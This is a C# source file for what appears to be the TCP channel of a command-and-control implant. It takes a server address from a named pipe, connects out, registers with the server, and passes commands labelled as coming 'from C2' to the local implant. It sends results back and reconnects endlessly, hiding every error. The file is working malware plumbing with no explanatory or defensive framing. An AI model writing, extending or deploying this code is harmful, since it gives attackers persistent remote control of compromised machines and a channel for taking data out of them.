using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using ExecUnitUtils;

namespace TcpListenerExecUnit
{
    internal class Program
    {
        const string DefaultPipeName = "QQQWWWEEE";
        const int SendPollIntervalMs = 100;
        const int ReconnectDelayMs = 5000;
        const uint KeepAliveTimeMs = 5000;
        const uint KeepAliveIntervalMs = 1000;

        static void Main(string[] args)
        {
            while (true)
            {
                try
                {
                    var client = new CommunicationNamedPipesListener(DefaultPipeName, null);
                    byte[] configData = client.Connect();
                    if (configData == null)
                    {
                        Thread.Sleep(ReconnectDelayMs);
                        continue;
                    }

                    if (!TryParseHostPort(configData, out string host, out int port))
                    {
                        Thread.Sleep(ReconnectDelayMs);
                        continue;
                    }

                    // Single long-lived sender across reconnects: only one consumer of
                    // client.GetDataToSend() ever exists, so a result can never be stolen
                    // by a stale thread from a previous session.
                    SenderHolder sender = new SenderHolder();
                    Thread sendThread = new Thread(() => RunSendLoop(client, sender))
                    {
                        IsBackground = true,
                        Name = "tcp-send"
                    };
                    sendThread.Start();

                    while (true)
                    {
                        RunOneSession(host, port, client, sender);
                        Thread.Sleep(ReconnectDelayMs);
                    }
                }
                catch (Exception)
                {
                    try { Thread.Sleep(ReconnectDelayMs); } catch { }
                }
            }
        }

        static bool TryParseHostPort(byte[] data, out string host, out int port)
        {
            host = null;
            port = 0;

            string hostPort = Encoding.UTF8.GetString(data);
            int sepIdx = hostPort.LastIndexOf(':');
            if (sepIdx <= 0 || sepIdx >= hostPort.Length - 1)
            {
                return false;
            }

            host = hostPort.Substring(0, sepIdx);
            return int.TryParse(hostPort.Substring(sepIdx + 1), out port);
        }

        static void RunOneSession(string host, int port, CommunicationNamedPipesListener client, SenderHolder sender)
        {
            TcpClient tcp = null;
            try
            {
                tcp = new TcpClient();
                tcp.Connect(host, port);
                EnableTcpKeepAlive(tcp.Client);
                NetworkStream stream = tcp.GetStream();
                object streamLock = new object();

                if (!SendInitialRegisterFrame(stream, streamLock, client))
                {
                    return;
                }

                sender.SetSession(stream, streamLock);
                try
                {
                    RunReadLoop(stream, client);
                }
                finally
                {
                    sender.ClearSession(stream);
                }
            }
            catch (SocketException) { }
            catch (IOException) { }
            catch (Exception) { }
            finally
            {
                if (tcp != null)
                {
                    try { tcp.Close(); } catch { }
                }
            }
        }

        sealed class SenderHolder
        {
            readonly object _gate = new object();
            NetworkStream _stream;
            object _streamLock;

            public void SetSession(NetworkStream stream, object streamLock)
            {
                lock (_gate)
                {
                    _stream = stream;
                    _streamLock = streamLock;
                    Monitor.PulseAll(_gate);
                }
            }

            public void ClearSession(NetworkStream stream)
            {
                lock (_gate)
                {
                    if (ReferenceEquals(_stream, stream))
                    {
                        _stream = null;
                        _streamLock = null;
                    }
                }
            }

            // Block until a live session is available, then write the framed payload.
            // If the write fails the session is dropped and we wait for the next one,
            // so the result is never silently consumed without a transmit attempt.
            public void Send(byte[] meta, byte[] data)
            {
                while (true)
                {
                    NetworkStream stream;
                    object streamLock;
                    lock (_gate)
                    {
                        while (_stream == null)
                        {
                            Monitor.Wait(_gate);
                        }
                        stream = _stream;
                        streamLock = _streamLock;
                    }

                    try
                    {
                        lock (streamLock)
                        {
                            WriteLE32(stream, meta.Length);
                            stream.Write(meta, 0, meta.Length);
                            WriteLE32(stream, data.Length);
                            stream.Write(data, 0, data.Length);
                            stream.Flush();
                        }
                        return;
                    }
                    catch (IOException)
                    {
                        ClearSession(stream);
                        // loop and wait for next session
                    }
                    catch (ObjectDisposedException)
                    {
                        ClearSession(stream);
                    }
                }
            }
        }

        static bool SendInitialRegisterFrame(
            NetworkStream stream, object streamLock, CommunicationNamedPipesListener client)
        {
            byte[] initialMeta = client.GetMetadata();
            if (initialMeta == null)
            {
                return false;
            }
            lock (streamLock)
            {
                WriteLE32(stream, initialMeta.Length);
                stream.Write(initialMeta, 0, initialMeta.Length);
                WriteLE32(stream, 0);
                stream.Flush();
            }
            return true;
        }

        static void RunSendLoop(CommunicationNamedPipesListener client, SenderHolder sender)
        {
            while (true)
            {
                try
                {
                    byte[] outData = client.GetDataToSend();
                    if (outData == null)
                    {
                        Thread.Sleep(SendPollIntervalMs);
                        continue;
                    }
                    byte[] outMeta = client.GetMetadata();
                    if (outMeta == null)
                    {
                        Thread.Sleep(SendPollIntervalMs);
                        continue;
                    }
                    sender.Send(outMeta, outData);
                }
                catch (Exception)
                {
                    try { Thread.Sleep(SendPollIntervalMs); } catch { }
                }
            }
        }

        static void RunReadLoop(NetworkStream stream, CommunicationNamedPipesListener client)
        {
            while (true)
            {
                int length = ReadLE32(stream);
                byte[] payload = ReadFully(stream, length);
                client.NewDataFromC2(payload);
            }
        }

        static void EnableTcpKeepAlive(Socket socket)
        {
            try
            {
                socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                byte[] vals = new byte[12];
                BitConverter.GetBytes((uint)1).CopyTo(vals, 0);
                BitConverter.GetBytes(KeepAliveTimeMs).CopyTo(vals, 4);
                BitConverter.GetBytes(KeepAliveIntervalMs).CopyTo(vals, 8);
                socket.IOControl(IOControlCode.KeepAliveValues, vals, null);
            }
            catch { }
        }

        static void WriteLE32(Stream s, int value)
        {
            byte[] b = new byte[4];
            b[0] = (byte)(value & 0xFF);
            b[1] = (byte)((value >> 8) & 0xFF);
            b[2] = (byte)((value >> 16) & 0xFF);
            b[3] = (byte)((value >> 24) & 0xFF);
            s.Write(b, 0, 4);
        }

        static int ReadLE32(Stream s)
        {
            byte[] b = ReadFully(s, 4);
            return b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24);
        }

        static byte[] ReadFully(Stream s, int count)
        {
            if (count < 0) throw new IOException("Refusing to read negative byte count: " + count);
            byte[] buf = new byte[count];
            int offset = 0;
            while (offset < count)
            {
                int read = s.Read(buf, offset, count - offset);
                if (read <= 0) throw new EndOfStreamException();
                offset += read;
            }
            return buf;
        }
    }
}
